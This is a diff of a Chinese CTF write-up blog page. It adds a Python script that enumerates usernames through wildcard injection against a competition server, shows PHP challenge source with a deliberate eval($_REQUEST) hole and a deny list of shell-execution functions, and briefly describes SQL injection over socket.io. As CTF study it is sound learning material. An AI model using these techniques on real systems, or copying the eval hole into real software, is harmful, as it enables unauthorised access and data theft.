@@ -24,7 +24,7 @@
 <meta property="og:image" content="https://tefuir72.github.io/2021/12/06/2021120623/2021120623/image-20211206232922390.png">
 <meta property="og:image" content="https://tefuir72.github.io/2021/12/06/2021120623/2021120623/image-20211206233018912.png">
 <meta property="article:published_time" content="2021-12-06T15:02:42.000Z">
-<meta property="article:modified_time" content="2021-12-06T16:20:33.715Z">
+<meta property="article:modified_time" content="2021-12-12T07:37:12.628Z">
 <meta property="article:author" content="Te Fuir">
 <meta property="article:tag" content="ctf">
 <meta name="twitter:card" content="summary">
@@ -172,7 +172,15 @@
 
 
 
-<h2 id="easyinject"><a href="#easyinject" class="headerlink" title="easyinject"></a>easyinject</h2><h2 id="hideandseek"><a href="#hideandseek" class="headerlink" title="hideandseek"></a>hideandseek</h2><p>源码</p>
+<h2 id="easyinject"><a href="#easyinject" class="headerlink" title="easyinject"></a>easyinject</h2><p>用*代替任意字符fuzz即可</p>
+<p>fuzz时注意多个用户</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#or4nge</span><br><span class="line">#递归查找</span><br><span class="line">import requests</span><br><span class="line">url = &quot;http://47.106.172.144:2333/&quot;</span><br><span class="line">alphabet = &#x27;abcdefghijklmnopqrstuvwxyz0123456789_&#x27;</span><br><span class="line">def search(flag):</span><br><span class="line">    for c in alphabet:</span><br><span class="line">        # print(flag+c+&#x27;*&#x27;)</span><br><span class="line">        r = requests.get(url, params=&#123;&#x27;user&#x27;:flag+c+&#x27;*&#x27;, &#x27;pass&#x27;:&#x27;1&#x27;&#125;)</span><br><span class="line">        if &#x27;找不到用户&#x27; in r.text:</span><br><span class="line">            pass</span><br><span class="line">        elif &#x27;查询用户不唯一&#x27; in r.text or &#x27;密码错误&#x27; in r.text:</span><br><span class="line">            # print(c+&#x27;\n&#x27;+r.text)</span><br><span class="line">            print(flag+c)</span><br><span class="line">            search(flag+c)</span><br><span class="line">        else:</span><br><span class="line">            print(&#x27;Error: [&#x27;+c+&#x27;]\n&#x27;+r.text)</span><br><span class="line">search(&#x27;&#x27;)</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="hideandseek"><a href="#hideandseek" class="headerlink" title="hideandseek"></a>hideandseek</h2><p>源码</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">//docker </span></span><br><span class="line"><span class="comment">//FROM php:8.1.0</span></span><br><span class="line"><span class="comment">//disable_functions=exec,shell_exec,system,passthru,popen,proc_open,putenv,getenv,pcntl_exec,fputs,fwrite,pcntl_fork,pcntl_waitpid,pcntl_setpriority,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_sigprocmask</span></span><br><span class="line"><span class="comment">//disable_classes = FFI</span></span><br><span class="line"><span class="comment">//chmod -R  0555 html/</span></span><br><span class="line"><span class="comment">//php -S 0.0.0.0:8000</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable">$flag</span>=file_get_contents(<span class="string">&#x27;/flag&#x27;</span>);<span class="comment">//看到这个flag了吗 (°▽°)ノ✿</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$flag</span>==<span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;看来你失败了&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">file_put_contents(<span class="string">&#x27;/flag&#x27;</span>,<span class="string">&#x27;&#x27;</span>);<span class="comment">//我把它覆盖了都不给你 （￣▽￣）</span></span><br><span class="line">test();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;eval&#x27;</span>]);<span class="comment">//来试试读flag吧 只有一次机会哦 执行结束flag真的会消失的说 重启容器间隔会很长时间呢 本地试好了再来试试吧 (〜￣△￣)〜 </span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&quot;eval&quot;</span>]))&#123;</span><br><span class="line">main();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure>
 
 <p>exp</p>
@@ -231,7 +239,12 @@
 
 
 
-<h2 id="wschat"><a href="#wschat" class="headerlink" title="wschat"></a>wschat</h2>
+<h2 id="wschat"><a href="#wschat" class="headerlink" title="wschat"></a>wschat</h2><p>反混淆<a target="_blank" rel="noopener" href="https://lelinhtinh.github.io/de4js/">https://lelinhtinh.github.io/de4js/</a></p>
+<p>ws注入</p>
+<p>前后端交互用的是socket io，参数格式用的是protobuf</p>
+<p>实现sql注入</p>
+<p><a target="_blank" rel="noopener" href="https://or4ngesec.github.io/post/dnuictf-writeup-by-or4nge/#wschat">https://or4ngesec.github.io/post/dnuictf-writeup-by-or4nge/#wschat</a></p>
+
   </div>
 </article>
 
